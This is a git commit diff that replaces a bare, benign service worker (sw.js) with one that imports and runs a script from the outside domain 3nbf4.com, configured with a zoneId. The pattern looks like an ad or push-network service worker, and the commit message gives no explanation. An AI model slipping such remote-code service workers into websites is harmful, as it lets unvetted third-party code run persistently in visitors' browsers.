2f3dfc370c0abbc75b5bfbd831be2badd1166329
ramrambhai09 <ramahir439@gmail.com>
2026-06-07 10:31:11 +0530

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,1 +1,6 @@
-self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));self.addEventListener('fetch',e=>{});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11112417
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
